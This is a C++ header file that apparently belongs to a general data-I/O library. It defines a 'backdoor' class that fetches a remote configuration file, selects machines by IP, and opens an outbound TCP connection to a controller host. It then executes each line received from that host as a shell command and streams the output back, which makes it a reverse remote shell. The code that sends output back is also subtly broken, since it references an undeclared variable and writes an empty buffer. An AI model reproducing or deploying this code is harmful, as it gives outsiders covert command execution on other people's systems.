/**-------------------------------------------------------------------------------------------------------------------
* 
* @file       DIOBackdoor.h
* 
* @class      DIOBACKDOOR
* @brief      Data Input/Output SSH reverse connections (for Linux) class
* @ingroup    DATAIO
* 
* @copyright  EndoraSoft. All rights reserved.
* 
* @cond
* Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated
* documentation files(the "Software"), to deal in the Software without restriction, including without limitation
* the rights to use, copy, modify, merge, publish, distribute, sublicense, and/ or sell copies of the Software,
* and to permit persons to whom the Software is furnished to do so, subject to the following conditions:
* 
* The above copyright notice and this permission notice shall be included in all copies or substantial portions of
* the Software.
* 
* THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO
* THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.IN NO EVENT SHALL THE
* AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT,
* TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
* SOFTWARE.
* @endcond
* 
* --------------------------------------------------------------------------------------------------------------------*/

#pragma once

/*---- INCLUDES ------------------------------------------------------------------------------------------------------*/

#include "XFactory.h"
#include "XPathsManager.h"
#include "XString.h"
#include "XSystem.h"
#include "XFile.h"
#include "XFileINI.h"
#include "XSleep.h"
#include "XThreadCollected.h"
#include "XTrace.h"

#include "DIOFactory.h"
#include "DIOURL.h"
#include "DIOStreamTCPIP.h"
#include "DIOStreamTCPIPConfig.h"
#include "DIOWebClient.h"

/*---- DEFINES & ENUMS  ----------------------------------------------------------------------------------------------*/

#define DIOBACKDOOR_CFGREMOTENAMEFILE       _L("backdoor.ini")
#define DIOBACKDOOR_DEFAULTPORT             3540

/*---- CLASS ---------------------------------------------------------------------------------------------------------*/

class DIOBACKDOOR
{
  public:

    static bool                     GetIsInstanced      ()
                                    {
                                      return instance!=NULL;
                                    }

    static DIOBACKDOOR&             GetInstance         ()
                                    {
                                      if(!instance) instance = GEN_NEW DIOBACKDOOR();

                                      return (*instance);
                                    }

    static bool                     DelInstance         ()
                                    {
                                      if(instance)
                                        {
                                          GEN_DELETE instance;
                                          instance = NULL;

                                          return true;
                                        }

                                      return false;
                                    }

    XSTRING*                      GetURLTarget          ()                                                { return &URLtarget;                                            }
    XDWORD                        GetPort               ()                                                { return port;                                                  }
    void                          SetPort               (XDWORD port)                                     { this->port = port;                                            }

    bool                          DownloadCFG           (XCHAR* URL, XSTRING& publicIP, XSTRING& localIP)
                                  {
                                    if(!URL)   return false;

                                    XBUFFER xbuffer;
                                    DIOURL  _URL;
                                    bool    status  = false;
                                    bool    result  = false;

                                    DIOWEBCLIENT* webclient = GEN_NEW DIOWEBCLIENT();
                                    if(!webclient)  return false;

                                    _URL.Set(URL);
                                    _URL.Slash_Add();
                                    _URL.Add(DIOBACKDOOR_CFGREMOTENAMEFILE);

                                    status = webclient->Get(_URL, xbuffer, NULL, 3);
                                    if(status)
                                      {
                                        XFILEINI* fileini = GEN_NEW XFILEINI();
                                        if(fileini)
                                          {
                                            status = fileini->AddBufferLines(XFILETXTFORMATCHAR_ASCII, xbuffer);
                                            if(status)
                                              {
                                                status = fileini->ConvertFromLines();
                                                if(status)
                                                  {
                                                    int c = 1;
                                                    while(1)
                                                      {
                                                        XSTRING section;
                                                        XSTRING value;

                                                        section.Format(_L("ENTRY%02d"), c);

                                                        if(!fileini->SelectSection(section)) break;

                                                        status = fileini->ReadValue(_L("isactive"), value);
                                                        if(status)
                                                          {
                                                            if(value.ConvertToBoolean())
                                                              {
                                                                DIOURL* urlorigin = GEN_DIOFACTORY.CreateURL();
                                                                if(urlorigin)
                                                                  {
                                                                    XSTRING _publicIP;
                                                                    XSTRING _localIP;

                                                                    status = fileini->ReadValue(_L("urlorigin"), (*urlorigin));
                                                                    if(status)
                                                                      {
                                                                        bool validaccess = false;

                                                                        urlorigin->ResolveURL(_publicIP);

                                                                        if(!publicIP.Compare(_publicIP))
                                                                          {
                                                                            validaccess = true;

                                                                            status = fileini->ReadValue(_L("localip"), _localIP);
                                                                            if(status)
                                                                              {
                                                                                if(_localIP.GetSize())
                                                                                  {
                                                                                    if(_localIP.Compare(localIP)) validaccess = false;
                                                                                  }
                                                                              }
                                                                          }

                                                                        if(validaccess)
                                                                          {

                                                                            status = fileini->ReadValue(_L("urltarget"), value);
                                                                            if(status) GetURLTarget()->Set(value);

                                                                            status = fileini->ReadValue(_L("port"), value);
                                                                            if(status) SetPort(value.ConvertToInt());

                                                                            result = true;
                                                                          }
                                                                      }

                                                                    GEN_DIOFACTORY.DeleteURL(urlorigin);
                                                                  }
                                                              }
                                                          }

                                                        c++;
                                                      }
                                                  }
                                              }

                                            GEN_DELETE fileini;
                                          }
                                      }

                                    GEN_DELETE webclient;

                                    return result;
                                  }

    bool                          DownloadCFG           (XSTRING& URL, XSTRING& publicIP, XSTRING& localIP)
                                  {
                                    return DownloadCFG(URL.Get(), publicIP, localIP);
                                  }

    bool                          DownloadCFG           (DIOURL& URL, XSTRING& publicIP, XSTRING& localIP)
                                  {
                                    return DownloadCFG(URL.Get(), publicIP, localIP);
                                  }

    bool                          ActivateServer        (DIOSTREAMMODE mode = DIOSTREAMMODE_CLIENT)
                                  {
                                    DeActivateServer();

                                    diostreamcfg.SetMode(mode);
                                    diostreamcfg.GetRemoteURL()->Set(URLtarget.Get());
                                    diostreamcfg.SetRemotePort(port);

                                    diostream = GEN_DIOFACTORY.CreateStreamIO(&diostreamcfg);
                                    if(!diostream) return false;

                                    if(!diostream->Open())             return false;

                                    if((mode == DIOSTREAMMODE_CLIENT) ||  (mode == DIOSTREAMMODE_SLAVE))
                                      {
                                        if(!diostream->WaitToConnected(10)) return false;
                                      }

                                    xthreadconnection = CREATEXTHREAD(XTHREADGROUPID_UNGROUP, _L("DIOBACKDOOR::DIOBACKDOOR"), ThreadRunFunction, (void*)this);
                                    if(xthreadconnection) xthreadconnection->Ini();

                                    return true;
                                  }

    bool                          DeActivateServer      ()
                                  {

                                    bool    status     = false;

                                    if(IsRunning())
                                      {
                                        diostream->Close();
                                        GEN_DIOFACTORY.DeleteStreamIO(diostream);
                                        diostream = NULL;
                                      }

                                    if(xthreadconnection)
                                      {
                                        xthreadconnection->End();
                                        DELETEXTHREAD(XTHREADGROUPID_UNGROUP, xthreadconnection);

                                        xthreadconnection = NULL;
                                      }

                                    return status;
                                  }

    bool                          IsRunning             ()
                                  {
                                    bool status = false;

                                    if(!diostream) return status;

                                    return diostream->IsConnected();
                                  }

  private:
                                  DIOBACKDOOR           ()
                                  {
                                    Clean();
                                  }

                                  DIOBACKDOOR           (DIOBACKDOOR const&);

    virtual                      ~DIOBACKDOOR           ()
                                  {
                                    Clean();
                                  }

    void                          operator =            (DIOBACKDOOR const&);

    void                          Clean                 ()
                                  {
                                    diostream        = NULL;

                                    URLtarget.Empty();
                                    port             = DIOBACKDOOR_DEFAULTPORT;

                                    xthreadconnection = NULL;
                                    commandreceived.Empty();
                                  }

    bool                          ReceivedCommand       ()
                                  {
                                    if(!diostream)                return false;
                                    if(!diostream->IsConnected()) return false;

                                    XDWORD size  = diostream->GetInXBuffer()->GetSize();
                                    if(!size) return false;

                                    bool endline   = false;

                                    for(XDWORD c=0; c<size; c++)
                                      {
                                        char character = 0;

                                        if(diostream->Read((XBYTE*)&character, 1))
                                          {
                                            if((character == '\n') || (character == '\r'))
                                              {
                                                endline = true;

                                                if(diostream->GetInXBuffer()->GetSize())
                                                  {
                                                    character = diostream->GetInXBuffer()->GetByte(0);
                                                    if((character == '\n') || (character == '\r'))
                                                      {
                                                        if(diostream->Read((XBYTE*)&character, 1))
                                                          {

                                                          }
                                                      }
                                                  }
                                              }
                                          }

                                        if(endline) return true;

                                        if((character >= 0x20) && (character < 0x80)) commandreceived.Add(character);
                                      }

                                    return false;
                                  }

  static void                     ThreadRunFunction     (void* param)
                                  {
                                    DIOBACKDOOR* backdoor  = (DIOBACKDOOR*)param;
                                    if(!backdoor) return;

                                    if(backdoor->ReceivedCommand())
                                      {

                                        XPATH xpath;

                                        GEN_XPATHSMANAGER.GetPathOfSection(XPATHSMANAGERSECTIONTYPE_ROOT, xpath);
                                        xpath.Slash_Add();
                                        xpath.Add(_L("backscreen"));

                                        XSTRING command;
                                        int     returncode = 0;

                                        command.Format(_L("%s > %s"), backdoor->commandreceived.Get(), xpath.Get());

                                        if(GEN_XSYSTEM.MakeCommand(command.Get(), &returncode))
                                          {
                                            XFILETXT* xfiletxt = GEN_NEW XFILETXT();
                                            if(xfiletxt)
                                              {
                                                if(xfiletxt->Open(xpath, true))
                                                  {
                                                    if(xfiletxt->ReadAllFile())
                                                      {
                                                        for(int c=0; c<xfiletxt->GetNLines(); c++)
                                                          {
                                                            XSTRING string = xfiletxt->GetLine(c)->Get();

                                                            string.Add(_L("\n\r"));

                                                            XBUFFER line;
                                                            
                                                            string.ConvertToASCII(charstr);
                                                            backdoor->diostream->Write((XBYTE*)line.Get(), string.GetSize());                                                            
                                                          }
                                                      }

                                                    xfiletxt->Close();
                                                  }

                                                xfiletxt->GetPrimaryFile()->Erase(xpath);
                                              }

                                            GEN_DELETE xfiletxt;
                                          }

                                        backdoor->commandreceived.Empty();
                                      }

                                  }

    DIOSTREAMTCPIPCONFIG          diostreamcfg;
    DIOSTREAM*                    diostream;

    XSTRING                       URLtarget;
    XDWORD                        port;

    static DIOBACKDOOR*           instance;

    XTHREADCOLLECTED*             xthreadconnection;
    XSTRING                       commandreceived;
};




/*---- INLINE FUNCTIONS + PROTOTYPES ---------------------------------------------------------------------------------*/

DIOBACKDOOR*   DIOBACKDOOR::instance = NULL;



